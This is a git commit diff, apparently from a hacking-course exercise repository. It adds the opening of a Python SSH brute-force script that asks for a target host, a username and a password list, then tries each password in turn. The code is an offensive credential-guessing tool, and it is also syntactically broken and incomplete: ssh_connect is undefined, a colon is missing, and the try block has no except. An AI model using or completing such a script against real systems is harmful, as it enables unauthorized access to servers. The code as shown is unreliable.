432f5d4bc30833747cbb89c2ad51ea30d5df3e07
albert18 <erertech@gmail.com>
2022-12-16 20:16:30 +0300

    update

--- 4. Udemy/1. Python 3 Hacking/3. Threaded SSH Bruteforce/sshbrute.py
+++ 4. Udemy/1. Python 3 Hacking/3. Threaded SSH Bruteforce/sshbrute.py
@@ -1,5 +1,17 @@
 import paramiko, sys, os, socket, termcolor
 
+host = input('[+] Target Address: ')
+username = input('[+] SSH Username: ')
+input_file = input('[+] Passwords File: ')
 
+if os.path.exists(input_file) == False:
+    print('[!!] The File/Path Doesnt Exist ')
+    sys.exit(1)
+    
+with open(input_file, 'r') as file:
+    for line in file.readlines()
+        password = line.strip()
+        try:
+            ssh_connect(password)
 
 
